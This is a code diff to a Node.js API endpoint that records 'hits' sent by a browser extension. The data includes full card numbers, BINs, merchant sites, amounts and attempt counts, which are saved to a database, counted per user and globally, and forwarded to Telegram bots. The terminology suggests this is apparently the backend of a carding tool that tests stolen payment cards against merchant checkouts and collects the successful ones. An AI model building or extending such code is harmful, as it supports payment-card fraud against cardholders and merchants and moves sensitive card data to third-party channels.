@@ -26,12 +26,22 @@ module.exports = async (req, res) => {
   const { user } = await requireAuth(req);
   if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
 
-  const {
-    card_number, bin, site, business_url, amount, currency,
-    attempt_count, time_taken,
-    // optional user-configured custom TG forward
-    tg_bot_token, tg_chat_id
-  } = req.body || {};
+  const b = req.body || {};
+  // Accept both naming conventions the extension sends
+  const card_number  = b.card_number || b.cardNumber || b.full_card || null;
+  const bin          = b.bin || null;
+  const site         = b.site || b.merchant || null;
+  const business_url = b.business_url || b.businessUrl || b.merchant || null;
+  const amount       = b.amount   || '0';
+  const currency     = b.currency || 'usd';
+  const attempt_count = b.attempt_count || b.attempt || 0;
+  const time_taken    = b.time_taken   || b.timeTaken || null;
+  // optional user-configured custom TG forward
+  const tg_bot_token = b.tg_bot_token || null;
+  const tg_chat_id   = b.tg_chat_id   || null;
+
+  let user_hits = user.hits || 0;
+  let global_hits = 0;
 
   try {
     // 1. Persist the hit
@@ -48,10 +58,15 @@ module.exports = async (req, res) => {
     });
 
     // 2. Increment user's hit counter
+    user_hits = (user.hits || 0) + 1;
     await supabase
       .from('users')
-      .update({ hits: (user.hits || 0) + 1 })
+      .update({ hits: user_hits })
       .eq('id', user.id);
+
+    // 2b. Fresh global total
+    const gAll = await supabase.from('hits').select('id', { count: 'exact', head: true });
+    global_hits = gAll.count || 0;
 
     // 3. Build Telegram message
     const sentAt = new Date().toLocaleString('en-US', { hour12: false });
@@ -95,7 +110,7 @@ module.exports = async (req, res) => {
 
     await Promise.allSettled(notifyTasks);
 
-    return res.json({ success: true });
+    return res.json({ success: true, hits: user_hits, user_hits, global_hits });
   } catch (err) {
     console.error('[hits/record]', err);
     return res.status(500).json({ success: false, error: 'Failed to record hit' });
